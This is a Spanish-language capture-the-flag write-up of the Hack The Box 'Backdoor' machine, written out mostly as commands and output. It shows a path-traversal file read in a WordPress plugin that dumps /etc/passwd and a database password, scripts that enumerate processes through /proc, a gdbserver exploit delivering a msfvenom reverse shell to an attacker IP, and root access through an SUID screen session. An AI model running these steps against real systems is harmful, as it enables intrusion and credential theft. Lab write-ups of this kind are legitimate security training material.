---
title: Backdoor Writeup
author: xdann1
date: 2022-04-27
categories: [Writeup, HTB]
tags: [Linux, CTF, Easy,  Wordpress, LFI, SUID, Directory Traversal, Bash Scripting]
image:
  path: ../../assets/img/commons/backdoor/backdoor.png
  width: 800
  height: 500
  alt: Banner Backdoor
---

Máquina Easy, encontramos un plugin vulnerable a un LFI, lo juntamos con un Directory Traversal y conseguimos ver un proceso vulnerable a un RCE, por último, conseguimos aprovecharnos de un binario SUID para escalar privilegios.

## Recopilación de Información

Primero vamos a comprobar la conectividad con la máquina.

```plaintext
❯ ping -c 1 10.10.11.125
PING 10.10.11.125 (10.10.11.125) 56(84) bytes of data.
64 bytes from 10.10.11.125: icmp_seq=1 ttl=63 time=40.1 ms

--- 10.10.11.125 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 40.147/40.147/40.147/0.000 ms
```

En la salida del comando anterior se puede ver un parametro llamado `ttl`, gracias a este parametro podemos saber que sistema operativo está corriendo en la máquina víctima.
* GNU/Linux = TTL 64 
* Windows = TTL 128

En este caso, el sistema operativo que está corriendo en la máquina víctima es GNU/Linux.

Vamos a usar la herramienta `nmap` para descubrir que puertos estan abiertos y que servicios estan asociados a estos.

```plaintext
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.125 -oG allPorts
```

* -p- > Escanea todos los puertos (65535)
* --open > Muestra solo los puertos con un estatus "open"
* -sS > Aplica un TCP SYN Scan
* --min-rate 5000 > Indica que quiero emitir paquetes no más lentos que 5000 paquetes por segundo
* -vvv > Muestra la información en pantalla a medida que se descubre
* -n > Indica que no aplique resolución DNS
* -Pn > Indica que no aplique el protocolo ARP
* 10.10.10.11.125 > Dirección IP que se quiere escanear
* -oG allPorts > Exporta el output a un fichero grepeable con nombre "allPorts"

Este sería el output del comando

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 18:53 CEST
Scanning 10.10.11.125 [65535 ports]
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63
```

Ahora vamos a realizar un escaneo más profundo, también con `nmap` pero esta vez solamente lanzaremos scripts básicos de enumeración y analizaremos la versión de los puertos abiertos obtenidos anteriormente.

```plaintext
❯ nmap -p22,80,1337 -sC -sV 10.10.11.125 -oN targeted
```

* -p22,80,1337 > Indica los puertos que se quieren escanear, en este caso el 22, 80 y 1337
* -sC > Lanza scripts básicos de enumeración
* -sV > Enumera la versión y servicio que está corriendo en los puertos
* 10.10.10.125 > Dirección IP que se quiere escanear
* -oN targeted > Exporta el output a un fichero en formato nmap con nombre "targeted"

Este sería el output del comando:

```plaintext
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-26 18:59 CEST
Nmap scan report for 10.10.11.125
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
```

Los puertos abiertos y sus servicios asocidados son:

* 22/tcp > ssh
* 80/tcp > http
* 1337/tcp > ?

Al entrar a la web podemos ver que se esta usando un gestor de contenidos Wordpress, esto lo podemos ver gracias a un plugin del navegador llamado `Wappalyzer`, también podemos acceder a esta información desde la consola con la herramienta `whatweb`.

```plaintext
❯ whatweb http://10.10.11.125/
http://10.10.11.125/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]
```

# Busqueda de vulnerabilidades

El servidor está corriendo la versión 5.8.1 de Wordpress, tras investigar un poco se puede ver que esta versión de Wordpress no tiene ninguna vulnerabilidad interesante, sin embargo, puede haber algun plugin que si tenga alguna, lo que convertiria al gestor de contenidos en vulnerable.

Existen varias herramientas para enumerar gestores de contenido, en este caso utilizare `WPScan` (herramienta para enumerar Wordpress).

```plaintext
❯ wpscan --url http://10.10.11.125 -e vp
[i] No plugins Found
```

* -e > Enumera 
* vp > Vulnerable Plugins

La herramienta no nos detecta ningún plugin, vamos a intentar enumerar el gestor de contenido de forma manual. El directorio en el que se alojan los plugins es `http://10.10.11.125/wp-content/plugins/`.

![Plugin Wordpress]({{ 'assets/img/commons/backdoor/plugin.png' | relative_url }}){: .center-image }
_Plugins Wordpress_

Podemos observar que existe un plugin que no nos ha mostrado WPScan, vamos a ver si este plugin tiene alguna vulnerabilidad asociada.

```plaintext
❯ searchsploit ebook wordpress
---------------------------------------------------------------- ------------------------- 
Exploit Title                                                   |  Path
---------------------------------------------------------------- -------------------------
WordPress Plugin eBook Download 1.1 - Directory Traversal       | php/webapps/39575.txt
```

Podemos ver que el plugin eBook Download tiene asociada una vulnerabilidad que nos permite leer archivos del servidor (LFI) desde la siguiente ruta:
`http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php`

# Explotación

Tenemos un LFI (Local File Inclusion), que juntado con un Directory Traversal nos permitirá ser capaces de leer archivos del servidor, vamos a intentar ver los usuarios existentes en la máquina víctima.

```plaintext
❯ curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../etc/passwd' | grep "sh$"
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:user:/home/user:/bin/bash
```

Ya tenemos un usuario con el que podriamos autenticarnos mediante ssh, ahora solamente necesitaremos algunas contraseñas. Podemos ver el archivo que utiliza Wordpress para la configuración de la comunicación con la base de datos.

```plaintext
❯ curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php'
```

Conseguimos credenciales de la base de datos

```plaintext
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'MQYBJSaD#DxG6qbm' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );
```

Desgraciadamente la máquina víctima no tiene MYSQL expuesto, podríamos intentar autenticarnos contra el servicio ssh o contra el panel de administrador de Wordpress pero no tendremos exito en ninguno de los casos anteriores.

Puesto que no podemos autenticarnos contra el sistema tendremos que seguir consiguiendo información mediante el LFI. Uno de los directorios m  s importantes para conseguir información es el `/proc`, este directorio contiene un subdirectorio por cada proceso que se esté ejecutando. Nos puede ser útil a la hora de enumerar el kernel y los procesos.

Sabiendo esto, podemos conseguir ver que puertos estan abiertos internamente con el siguiente one-liner:

```bash
for port in $(curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/net/tcp' | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(echo "ibase=16; $port" | bc)" ;done
```

Podemos ver que la máquina víctima tiene los siguientes puertos abiertos internamente:

```plaintext
[0016] -> Puerto 22
[0035] -> Puerto 53
[0539] -> Puerto 1337
[0CEA] -> Puerto 3306
[8124] -> Puerto 33060
[9B5A] -> Puerto 39770
[B2D0] -> Puerto 45776
```

Sigamos recopilando información, ahora intentaremos listar y obtener información sobre como se crearon todos los procesos que están en ejecución, para ello necesitaremos listar una serie de objetos de los procesos, puede ver más información sobre esto [aquí](https://0xffsec.com/handbook/web-applications/file-inclusion-and-path-traversal/#useful-proc-entries). Usaremos el siguiente script para enumerar los servicios:

```bash
#!/bin/bash

for pid in $(curl -s 'http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/sched_debug' --output - | awk '{print $3}' | grep -oP "\d{1,6}" | sort -u); do 

	content=$(timeout 1 bash -c "curl -s "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../../../../../../../../../proc/$pid/cmdline"" --output - | awk -F 'cmdline' '{print $4}' | awk -F '<script>' '{print $1}' | tr -d "\0" &)

	if [[ $content ]]; then
		echo "[*] PID $pid: " | tr -d "\n"
		echo $content
	fi

done
```

La salida nos devuelve algunas cosas interesantes, los procesos con el PID (Process IDentifier) 791, 138936, 138937 y 138942 nos muestran que esta corriendo `gdbserver` en el puerto 1337. También nos muestra un proceso (PID 788) que utiliza el comando `screen`, esto nos puede llegar a servir en la escalada de privilegios.

```plaintext
[*] PID 788: /bin/sh-cwhile true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done
[*] PID 791: /bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
[*] PID 811: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
[*] PID 1027: /usr/sbin/mysqld
[*] PID 1032: /usr/sbin/mysqld
[*] PID 136293: /bin/sh
[*] PID 136404: /bin/bash
[*] PID 138937: bash-ccd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;
[*] PID 139002: -/bin/bash
```

**¿Qué es gdbserver?**

gdbserver es un programa informático que permite depurar otros programas de forma remota.

gdbserver cuenta con una vulnerabilidad para la versión 9.2 que nos permitira obtener un RCE (Remote Command Execution).

```plaintext
❯ searchsploit gdbserver
---------------------------------------------------------------- ------------------------- 
Exploit Title                                                   |  Path
---------------------------------------------------------------- -------------------------
GNU gdbserver 9.2 - Remote Command Execution (RCE)              | linux/remote/50539.py
```
El exploit nos pedirá que generemos una reverse shell con la herramienta msfvenom.

```plaintext
❯ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.242 LPORT=443 PrependFork=true -o rev.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 106 bytes
Saved as: rev.bin
```

Esta reverse shell indica que cuando se ejecute envie una shell a la IP 10.10.14.242 por el puerto 443.

```plaintext
❯ python3 exploit.py 10.10.11.125:1337 rev.bin
[+] Connected to target. Preparing exploit
[+] Found x64 arch
[+] Sending payload
[*] Pwned!! Check your listener
```

Tenemos acceso a la máquina víctima :D

# Post-explotación

Ya podriamos leer la flag del usuarios, pero primero haremos funcional la terminal, para que podamos hacer CTRL + C, CTRL + V...

```plaintext
❯ nc -nlvp 443 
listening on [any] 443 ...
connect to [10.10.14.242] from (UNKNOWN) [10.10.11.125] 41368
❯ script /dev/null -c bash
Script started, file is /dev/null
❯ user@Backdoor:/home/user$ CTRL + Z
[1]+ Detenido		nc -nlvp 443
❯ stty raw -echo; fg
nc -nlvp 443
	reset
reset: unknow terminal type unknown
Terminal type? xterm
❯ export SHELL=bash
❯ export TERM=xterm
❯ stty rows 49 columns 189
```

Ahora si, leeremos la flag del usuario.

```plaintext
❯ cat user.txt
9d44e4692ebdcf2d****************
```

Empezaremos con una enumeración básica, vamos a ver si pertenecemos a algun grupo interesante:

```plaintext
❯ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

No tenemos nada interesante, podemos empezar a enumerar binarios con permisos SUID.

```plaintext
❯ find / -perm -u=s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/su
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/fusermount
/usr/bin/screen
/usr/bin/umount
/usr/bin/mount
/usr/bin/chsh
/usr/bin/pkexec
```

Todos estos binarios es normal que tengan permisos SUID, pero recordemos que en la enumeración de procesos descubrimos que se estaba ejecutando el comando `screen`. Ese proceso comprobaba cada segundo que un directorio estubiera vacío, de ser este el caso ejecutaba `screen -dmS root`.

Este comando crea con el usuario root una sesión llamada `root`, gracias a que hemos enumerado los binarios con permisos SUID sabemos que podemos utilizar el comando `screen` como root, por lo tanto podemos acceder a su sesión.

```plaintext
❯ screen -r root/root
❯ whoami
root
```

Ya podemos leer la flag de root 

```plaintext
❯ cat root.txt
fb01c701a89c7223****************
```
